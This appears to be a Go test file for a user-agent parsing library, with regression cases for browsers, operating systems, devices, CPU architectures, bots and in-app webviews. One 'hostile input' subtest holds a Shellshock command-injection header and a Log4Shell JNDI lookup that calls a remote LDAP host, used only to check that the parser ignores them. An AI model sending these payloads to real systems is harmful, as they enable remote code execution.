package useragent

import (
	"strings"
	"testing"
)

type want struct {
	browser        string
	browserVersion string
	os             string
	osVersion      string
	device         DeviceType
	checkDevice    bool
	vendor         string
	model          string
	cpu            string
	engine         string
	engineVersion  string
	botDetected    *bool
	botName        string
	botVersion     string
	botURL         string
	botCategory    *BotCategory
	app            string
	appVersion     string
	inApp          *bool
	webView        *bool
}

func boolPtr(v bool) *bool { return &v }

func catPtr(v BotCategory) *BotCategory { return &v }

func check(t *testing.T, ua UserAgent, w want) {
	t.Helper()
	if w.browser != "" && ua.Browser.Name != w.browser {
		t.Errorf("Browser.Name = %q, want %q", ua.Browser.Name, w.browser)
	}
	if w.browserVersion != "" && ua.Browser.Version != w.browserVersion {
		t.Errorf("Browser.Version = %q, want %q", ua.Browser.Version, w.browserVersion)
	}
	if w.os != "" && ua.OS.Name != w.os {
		t.Errorf("OS.Name = %q, want %q", ua.OS.Name, w.os)
	}
	if w.osVersion != "" && ua.OS.Version != w.osVersion {
		t.Errorf("OS.Version = %q, want %q", ua.OS.Version, w.osVersion)
	}
	if w.checkDevice && ua.Device.Type != w.device {
		t.Errorf("Device.Type = %v, want %v", ua.Device.Type, w.device)
	}
	if w.vendor != "" && ua.Device.Vendor != w.vendor {
		t.Errorf("Device.Vendor = %q, want %q", ua.Device.Vendor, w.vendor)
	}
	if w.model != "" && ua.Device.Model != w.model {
		t.Errorf("Device.Model = %q, want %q", ua.Device.Model, w.model)
	}
	if w.cpu != "" && ua.CPU.Architecture != w.cpu {
		t.Errorf("CPU.Architecture = %q, want %q", ua.CPU.Architecture, w.cpu)
	}
	if w.engine != "" && ua.Engine.Name != w.engine {
		t.Errorf("Engine.Name = %q, want %q", ua.Engine.Name, w.engine)
	}
	if w.engineVersion != "" && ua.Engine.Version != w.engineVersion {
		t.Errorf("Engine.Version = %q, want %q", ua.Engine.Version, w.engineVersion)
	}
	if w.botDetected != nil && ua.Bot.Detected != *w.botDetected {
		t.Errorf("Bot.Detected = %v, want %v", ua.Bot.Detected, *w.botDetected)
	}
	if w.botName != "" && ua.Bot.Name != w.botName {
		t.Errorf("Bot.Name = %q, want %q", ua.Bot.Name, w.botName)
	}
	if w.botVersion != "" && ua.Bot.Version != w.botVersion {
		t.Errorf("Bot.Version = %q, want %q", ua.Bot.Version, w.botVersion)
	}
	if w.botURL != "" && ua.Bot.URL != w.botURL {
		t.Errorf("Bot.URL = %q, want %q", ua.Bot.URL, w.botURL)
	}
	if w.botCategory != nil && ua.Bot.Category != *w.botCategory {
		t.Errorf("Bot.Category = %v, want %v", ua.Bot.Category, *w.botCategory)
	}
	if w.app != "" && ua.App.Name != w.app {
		t.Errorf("App.Name = %q, want %q", ua.App.Name, w.app)
	}
	if w.appVersion != "" && ua.App.Version != w.appVersion {
		t.Errorf("App.Version = %q, want %q", ua.App.Version, w.appVersion)
	}
	if w.inApp != nil && ua.App.InApp != *w.inApp {
		t.Errorf("App.InApp = %v, want %v", ua.App.InApp, *w.inApp)
	}
	if w.webView != nil && ua.WebView != *w.webView {
		t.Errorf("WebView = %v, want %v", ua.WebView, *w.webView)
	}
}

func TestDetectionRegressions(t *testing.T) {
	t.Run("QQ Browser", func(t *testing.T) {
		raw := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36 Core/1.116.225.400 QQBrowser/13.5.6297.400"
		ua := Parse(raw)
		check(t, ua, want{
			browser: QQBrowser, browserVersion: "13.5.6297.400", os: Windows, osVersion: "10.0",
			device: DeviceDesktop, checkDevice: true, cpu: "amd64",
			botDetected: boolPtr(false),
		})
		if ua.Browser.VersionNo != (Version{13, 5, 6297}) {
			t.Errorf("VersionNo = %+v", ua.Browser.VersionNo)
		}
	})

	t.Run("Facebook iMessage preview", func(t *testing.T) {
		raw := "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.4 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.4 facebookexternalhit/1.1 Facebot Twitterbot/1.0"
		ua := Parse(raw)
		check(t, ua, want{
			browser: Safari, browserVersion: "9.0.1", os: MacOS, osVersion: "10.11.1",
			device: DeviceDesktop, checkDevice: true,
			botDetected: boolPtr(true), botName: FacebookExternal, botVersion: "1.1",
			botCategory: catPtr(BotSocial),
		})
		if !ua.IsBot() {
			t.Error("IsBot() = false")
		}
	})

	t.Run("Splash with version", func(t *testing.T) {
		raw := "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) splash Version/10.0 Safari/602.1"
		ua := Parse(raw)
		check(t, ua, want{
			browser: Splash, browserVersion: "10.0", os: Linux, cpu: "amd64",
			botDetected: boolPtr(true), botName: Splash, botCategory: catPtr(BotScraper),
		})
	})

	t.Run("Splash without version", func(t *testing.T) {
		raw := "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) splash Safari/538.1"
		ua := Parse(raw)
		check(t, ua, want{
			browser: Splash, os: Linux,
			botDetected: boolPtr(true), botName: Splash, botCategory: catPtr(BotScraper),
		})
		if ua.Browser.Version != "" {
			t.Errorf("Browser.Version = %q, want empty", ua.Browser.Version)
		}
	})

	t.Run("Scrapy", func(t *testing.T) {
		raw := "Scrapy/2.6.3 (+https://scrapy.org)"
		ua := Parse(raw)
		check(t, ua, want{
			browser: Scrapy, browserVersion: "2.6.3",
			botDetected: boolPtr(true), botName: Scrapy, botVersion: "2.6.3",
			botURL: "https://scrapy.org", botCategory: catPtr(BotScraper),
		})
	})

	t.Run("QXSEC Android app", func(t *testing.T) {
		raw := "Mozilla/5.0 (7334MB; 1080x2166; 401x401; 392x787; Xiaomi M2101K9G; 13) AppleWebKit/537.36 (KHTML, like Gecko)  QXSEC Android App 1.435.390 Phone Hybrid()  GooglePlayStore QxsecApp/1.435.390 (GlobalDist; GooglePlayStore)"
		ua := Parse(raw)
		check(t, ua, want{
			browser: "QXSEC Android App", browserVersion: "1.435.390",
			os: Android, osVersion: "13", device: DeviceMobile, checkDevice: true,
			vendor: "Xiaomi", model: "M2101K9G",
			app: "QxsecApp", appVersion: "1.435.390", inApp: boolPtr(true), webView: boolPtr(true),
			botDetected: boolPtr(false),
		})
	})

	t.Run("UC Browser model", func(t *testing.T) {
		raw := "Mozilla/5.0 (Linux; U; Android 13; zh-CN; 23049RAD8C Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 UCBrowser/16.3.6.1287 Mobile Safari/537.36"
		ua := Parse(raw)
		check(t, ua, want{
			browser: UCBrowser, browserVersion: "16.3.6.1287",
			os: Android, osVersion: "13", device: DeviceMobile, checkDevice: true,
			model: "23049RAD8C",
		})
	})

	t.Run("QQ Browser model and app", func(t *testing.T) {
		raw := "Mozilla/5.0 (Linux; Android 13; 22021211RC Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.71 MQQBrowser/6.2 TBS/047205 Mobile Safari/537.36 V1_AND_SQ_9.1.0_7518_YYB_D QQ/9.1.0.19695 NetType/4G WebP/0.3.0 AppId/537244898 Pixel/1080 StatusBarHeight/80 SimpleUISwitch/0 QQTheme/1000 StudyMode/0 CurrentMode/0 CurrentFontScale/1.0 GlobalDensityScale/0.9818182 AllowLandscape/false InMagicWin/0"
		ua := Parse(raw)
		check(t, ua, want{
			browser: QQBrowser, browserVersion: "6.2",
			os: Android, osVersion: "13", device: DeviceMobile, checkDevice: true,
			model: "22021211RC", app: "QQ", appVersion: "9.1.0.19695",
			inApp: boolPtr(true), webView: boolPtr(true),
		})
	})

	t.Run("bare AppleWebKit", func(t *testing.T) {
		raw := "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
		ua := Parse(raw)
		check(t, ua, want{
			browser: AppleWebKit, browserVersion: "605.1.15", os: MacOS, osVersion: "10.15.7",
			device: DeviceDesktop, checkDevice: true, engine: "WebKit", engineVersion: "605.1.15",
			webView: boolPtr(true),
		})
	})

	t.Run("HeyTapBrowser", func(t *testing.T) {
		raw := "Mozilla/5.0 (X11; Windows) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.61 Safari/537.36 HeyTapBrowser/40.8.26.1 Name:HeyTapBrowser"
		ua := Parse(raw)
		check(t, ua, want{
			browser: HeyTapBrowser, browserVersion: "40.8.26.1",
			os: Android, device: DeviceMobile, checkDevice: true,
			botDetected: boolPtr(false),
		})
	})

	t.Run("GCP proxy prefix", func(t *testing.T) {
		raw := "cloud-run-proxy/source (darwin/arm64) Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
		ua := Parse(raw)
		check(t, ua, want{
			browser: Chrome, browserVersion: "120.0.0.0", os: MacOS, osVersion: "10.15.7",
			device: DeviceDesktop, checkDevice: true, cpu: "arm64", engine: "Blink",
		})
	})

	t.Run("Smart TV", func(t *testing.T) {
		raw := "Mozilla/5.0 (SMART-TV; LINUX; Tizen 6.5) AppleWebKit/537.36 (KHTML, like Gecko) 85.0.4183.93/6.5 TV Safari/537.36"
		ua := Parse(raw)
		check(t, ua, want{
			browser: Safari, browserVersion: "537.36", os: Tizen, osVersion: "6.5",
			device: DeviceTV, checkDevice: true,
		})
		if ua.IsMobile() || ua.IsDesktop() {
			t.Errorf("Mobile/Desktop should be false; device=%v", ua.Device.Type)
		}
	})

	t.Run("Flutter iOS CFNetwork", func(t *testing.T) {
		raw := "CFNetwork/1404.0.5 Darwin/22.3.0 (iPhone iOS/16.3.1)"
		ua := Parse(raw)
		check(t, ua, want{
			browser: CFNetwork, browserVersion: "1404.0.5", os: IOS, osVersion: "16.3.1",
			device: DeviceMobile, checkDevice: true, vendor: "Apple", model: "iPhone",
			inApp: boolPtr(true), webView: boolPtr(true),
		})
	})

	t.Run("GoogleOther", func(t *testing.T) {
		raw := "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.117 Mobile Safari/537.36 (compatible; GoogleOther)"
		ua := Parse(raw)
		check(t, ua, want{
			browser: GoogleOther, botDetected: boolPtr(true), botName: GoogleOther,
			botCategory: catPtr(BotSearch), os: Android, osVersion: "6.0.1",
			device: DeviceMobile, checkDevice: true, vendor: "Google", model: "Nexus 5X",
		})
	})

	t.Run("Coc Coc", func(t *testing.T) {
		raw := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/112.0.192 Chrome/106.0.5249.126 Safari/537.36"
		ua := Parse(raw)
		check(t, ua, want{
			browser: CocCoc, browserVersion: "112.0.192", os: Windows,
			device: DeviceDesktop, checkDevice: true,
		})
	})

	t.Run("ChromeOS version", func(t *testing.T) {
		raw := "Mozilla/5.0 (X11; CrOS x86_64 14150.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.114 Safari/537.36"
		ua := Parse(raw)
		check(t, ua, want{
			browser: Chrome, browserVersion: "94.0.4606.114", os: ChromeOS, osVersion: "14150.74.0",
			device: DeviceDesktop, checkDevice: true, cpu: "amd64",
		})
	})
}

func TestCPUArchitectureRegressions(t *testing.T) {
	tests := []struct {
		name string
		raw  string
		want string
	}{
		{"windows x64", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36", "amd64"},
		{"linux x86_64", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36", "amd64"},
		{"cros armv7l", "Mozilla/5.0 (X11; CrOS armv7l 14388.62.1) AppleWebKit/537.36 Chrome/94.0.0.0 Safari/537.36", "arm"},
		{"cros x86_64", "Mozilla/5.0 (X11; CrOS x86_64 14150.74.0) AppleWebKit/537.36 Chrome/94.0.0.0 Safari/537.36", "amd64"},
		{"darwin arm64", "cloud-run-proxy/source (darwin/arm64) Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36", "arm64"},
		{"iphone", "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile/15E148 Safari/604.1", ""},
		{"wow64", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 Chrome/59.0.3071.115 Safari/537.36", "386"},
		{"aarch64", "Mozilla/5.0 (X11; CrOS aarch64 14388.62.1) AppleWebKit/537.36 Chrome/94.0.0.0 Safari/537.36", "arm64"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ua := Parse(tt.raw)
			if ua.CPU.Architecture != tt.want {
				t.Errorf("CPU.Architecture = %q, want %q", ua.CPU.Architecture, tt.want)
			}
		})
	}
}

func TestEdgeCaseRegressions(t *testing.T) {
	t.Run("lowercase", func(t *testing.T) {
		raw := strings.ToLower("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
		ua := Parse(raw)
		check(t, ua, want{
			browser: Chrome, browserVersion: "120.0.0.0", os: Windows, osVersion: "10.0",
			device: DeviceDesktop, checkDevice: true, cpu: "amd64",
		})
	})

	t.Run("hostile input", func(t *testing.T) {
		for _, raw := range []string{
			`() { ignored; }; echo Content-Type: text/plain ; echo ; echo "bash_cve_2014_6271_rce Output : $((70+91))"`,
			`${jndi:ldap://log4shell-generic-8ZnJfq2XFL3GWyaLyOpT${lower:ten}.w.nessus.org/nessus}`,
		} {
			ua := Parse(raw)
			if ua.Browser.Name != "" {
				t.Errorf("hostile input produced browser %q", ua.Browser.Name)
			}
			if ua.Bot.Detected {
				t.Errorf("hostile input produced bot %q", ua.Bot.Name)
			}
		}
	})

	t.Run("Brave", func(t *testing.T) {
		raw := "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/87.0.4280.101 Safari/537.36"
		ua := Parse(raw)
		if ua.Browser.Name != Brave && ua.Browser.Name != Chrome {
			t.Errorf("Browser.Name = %q", ua.Browser.Name)
		}
		if ua.Engine.Name != "Blink" {
			t.Errorf("Engine.Name = %q", ua.Engine.Name)
		}
	})

	t.Run("Safari desktop", func(t *testing.T) {
		raw := "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
		ua := Parse(raw)
		check(t, ua, want{
			browser: Safari, browserVersion: "14.0.3", os: MacOS,
			device: DeviceDesktop, checkDevice: true,
		})
		if ua.IsMobile() {
			t.Error("desktop Safari reported mobile")
		}
	})

	t.Run("Pixel model", func(t *testing.T) {
		raw := "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36"
		ua := Parse(raw)
		check(t, ua, want{
			os: Android, device: DeviceMobile, checkDevice: true,
			vendor: "Google", model: "Pixel 4",
		})
	})

	t.Run("Miui Browser", func(t *testing.T) {
		raw := "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/79.0.3945.147 Safari/534.24 XiaoMi/MiuiBrowser/12.11.5-gn"
		ua := Parse(raw)
		check(t, ua, want{
			browser: MiuiBrowser, browserVersion: "12.11.5-gn", os: Android,
			device: DeviceMobile, checkDevice: true,
		})
	})

	t.Run("HeadlessChrome", func(t *testing.T) {
		raw := "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/97.0.4691.0 Safari/537.36"
		ua := Parse(raw)
		check(t, ua, want{
			browser: HeadlessChrome, browserVersion: "97.0.4691.0",
			botDetected: boolPtr(true), botName: HeadlessChrome, botCategory: catPtr(BotHeadless),
		})
		if ua.Browser.Name == Safari {
			t.Error("HeadlessChrome reported as Safari")
		}
	})

	t.Run("Android WebView", func(t *testing.T) {
		raw := "Mozilla/5.0 (Linux; Android 10; SM-G960F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36"
		ua := Parse(raw)
		check(t, ua, want{os: Android, webView: boolPtr(true)})
	})

	t.Run("Google Ads bots", func(t *testing.T) {
		for _, raw := range []string{
			"Mozilla/5.0 (Linux; Android 4.0.0; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko; Mediapartners-Google) Chrome/104.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
		} {
			ua := Parse(raw)
			if !ua.Bot.Detected {
				t.Errorf("bot not detected for %q", raw)
			}
			if ua.Bot.Category != BotAds {
				t.Errorf("Bot.Category = %v, want ads", ua.Bot.Category)
			}
		}
	})

	t.Run("Seafile app", func(t *testing.T) {
		ua := Parse("Seafile/9.0.2 (Linux)")
		check(t, ua, want{
			os: Linux, app: "Seafile", appVersion: "9.0.2", inApp: boolPtr(true),
		})
	})

	t.Run("NetFront", func(t *testing.T) {
		raw := "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0"
		ua := Parse(raw)
		check(t, ua, want{
			browser: NetFront, browserVersion: "3.3", device: DeviceMobile, checkDevice: true,
		})
	})

	t.Run("Konqueror FreeBSD", func(t *testing.T) {
		raw := "Mozilla/5.0 (compatible; Konqueror/4.5; FreeBSD) KHTML/4.5.4 (like Gecko)"
		ua := Parse(raw)
		check(t, ua, want{
			browser: Konqueror, browserVersion: "4.5", os: FreeBSD,
			device: DeviceDesktop, checkDevice: true,
		})
	})

	t.Run("Samsung Internet", func(t *testing.T) {
		raw := "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36"
		ua := Parse(raw)
		check(t, ua, want{
			browser: SamsungBrowser, browserVersion: "9.2", os: Android,
			device: DeviceMobile, checkDevice: true,
		})
	})

	t.Run("Bytespider", func(t *testing.T) {
		ua := Parse("Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.0.0 Safari/537.36")
		check(t, ua, want{botDetected: boolPtr(true), botName: Bytespider})
	})

	t.Run("facebookcatalog", func(t *testing.T) {
		ua := Parse("facebookcatalog/1.0")
		check(t, ua, want{
			botDetected: boolPtr(true), botName: "facebookcatalog",
			botVersion: "1.0", botCategory: catPtr(BotSocial),
		})
	})
}

func TestAdditionalTVFixtures(t *testing.T) {
	tests := []string{
		"Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 WebAppManager",
		"Mozilla/5.0 (Linux; Android 9; HbbTV/1.5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 10; GoogleTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Safari/537.36",
		"Mozilla/5.0 (SMART-TV; Linux; Tizen 5.5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/56.0.2924.76 TV Safari/537.36",
	}
	for _, raw := range tests {
		t.Run(raw, func(t *testing.T) {
			ua := Parse(raw)
			if ua.Device.Type != DeviceTV {
				t.Errorf("Device.Type = %v, want TV", ua.Device.Type)
			}
			if ua.OS.Name == "" {
				t.Error("OS.Name is empty")
			}
		})
	}
}
